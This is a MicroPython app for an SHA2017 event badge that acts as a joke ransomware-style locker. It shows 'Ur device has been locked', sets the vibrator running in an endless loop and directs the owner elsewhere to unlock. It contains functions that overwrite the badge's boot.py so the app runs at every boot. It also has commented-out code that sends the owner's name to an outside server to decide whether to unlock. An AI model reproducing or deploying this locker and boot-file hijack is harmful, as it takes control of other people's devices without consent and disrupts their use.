import badge, ugfx, wifi, time
#import urequests as requests

#badge.leds_enable()
#leds_array = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100])
#badge.leds_send_data(leds_array)

_continue = 1       
    
  
def change_boot():
    print("Updating 'boot.py'...")
    with open("/boot.py", "w") as f:
            f.write("""\
import badge, machine, esp, ugfx, sys
badge.init()
ugfx.init()
esp.rtcmem_write(0,0)
esp.rtcmem_write(1,0)
#tnx to the ascii porn app. so we didnt had to type it all over :p
splash = '1234567890'
if machine.reset_cause() != machine.DEEPSLEEP_RESET:
    print('[BOOT] Cold boot')
else:
    print("[BOOT] Wake from sleep")
    load_me = esp.rtcmem_read_string()
    if load_me:
        splash = load_me
        print("starting %s" % load_me)
        esp.rtcmem_write_string("")
try:
    if not splash=="shell":
        __import__(splash)
    else:
        ugfx.clear(ugfx.WHITE)
        ugfx.flush(ugfx.LUT_FULL)
except BaseException as e:
    sys.print_exception(e)
    import easydraw
    easydraw.msg("A fatal error occured!","Still Crashing Anyway", True)
    easydraw.msg("")
    easydraw.msg("Guru meditation:")
    easydraw.msg(str(e))
    easydraw.msg("")
    easydraw.msg("Rebooting in 5 seconds...")
    import time
    time.sleep(5)
    import appglue
    appglue.home()
    """)

def reset_boot():
    print("Updating 'boot.py'...")
    with open("/boot.py", "w") as f:
            f.write("""\
# This file is executed on every boot (including wake-boot from deepsleep)
import badge, machine, esp, ugfx, sys
badge.init()
ugfx.init()
esp.rtcmem_write(0,0)
esp.rtcmem_write(1,0)
splash = badge.nvs_get_str('boot','splash','splash')
if machine.reset_cause() != machine.DEEPSLEEP_RESET:
    print('[BOOT] Cold boot')
else:
    print("[BOOT] Wake from sleep")
    load_me = esp.rtcmem_read_string()
    if load_me:
        splash = load_me
        print("starting %s" % load_me)
        esp.rtcmem_write_string("")
try:
    if not splash=="shell":
        __import__(splash)
    else:
        ugfx.clear(ugfx.WHITE)
        ugfx.flush(ugfx.LUT_FULL)
except BaseException as e:
    sys.print_exception(e)
    import easydraw
    easydraw.msg("A fatal error occured!","Still Crashing Anyway", True)
    easydraw.msg("")
    easydraw.msg("Guru meditation:")
    easydraw.msg(str(e))
    easydraw.msg("")
    easydraw.msg("Rebooting in 5 seconds...")
    import time
    time.sleep(5)
    import appglue
    appglue.home()
    """)
  
  
  
def await_wifi():
    while not wifi.sta_if.isconnected():
        time.sleep(0.1)
        pass
      
def setup(): 
  
    ugfx.init()
    badge.init()
    wifi.init()
    
    #badge.nvs_set_str('boot','splash','1234567890') 
    #change_boot()
    
    #await_wifi()
    #r_nick = badge.nvs_get_str("owner", "name", 'test')
    #t = requests.get("http://project1.online/sha2017-plsdonthackme/r_show.php?name=" + str(r_nick))
    #_id = t.content
    #if str(int(_id)) == "0":
    #    global _continue
    #    _continue = 0
        
def loop2():
    global _continue
        
    if (_continue):
       
        #change_boot()

        ugfx.clear(ugfx.BLACK)
        ugfx.line(0, 30, 300, 33, ugfx.WHITE)
        ugfx.string(80, 10, "Ooohh no :'(", "DejaVuSans20", ugfx.WHITE)
        ugfx.string(3, 30, 'Ur device has been locked', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.flush()
        
        
        wifi.init()
        await_wifi()
        
        leds_array = bytes([0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100])
        badge.leds_send_data(leds_array)
        
        r_id = badge.nvs_get_str("owner", "name", 'test')

        ugfx.string(3, 55, 'ID: ' + r_id, 'Roboto_BlackItalic24', ugfx.WHITE)
        #ugfx.string(3, 55, 'Your ID is: {}'.format(str(int(r_id))), 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 80, 'unlock ur badge 4 free ;)', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 105, 'at imgur.com/11L2v2H', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 110, 'or the badge bar (laptop with red keyboard)', 'Roboto_Regular12', ugfx.WHITE)
        ugfx.flush()
        
        
        while 1:
            badge.vibrator_activate(0xFF)
  
    else:     
        leds_array = bytes([255, 0, 0, 100, 255, 0, 0, 100, 255, 0, 0])
        badge.leds_send_data(leds_array)
        
        #reset_boot()
        ugfx.clear(ugfx.BLACK)
        ugfx.line(0, 30, 300, 33, ugfx.WHITE)
        ugfx.string(80, 10, "Ooohh yes :)", "DejaVuSans20", ugfx.WHITE)
        ugfx.string(3, 30, 'Ur device is UN-locked', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 55, 'dont fall for this again', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 80, 'uninstall the app to ', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 105, 'remove this message', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.flush()
    return 100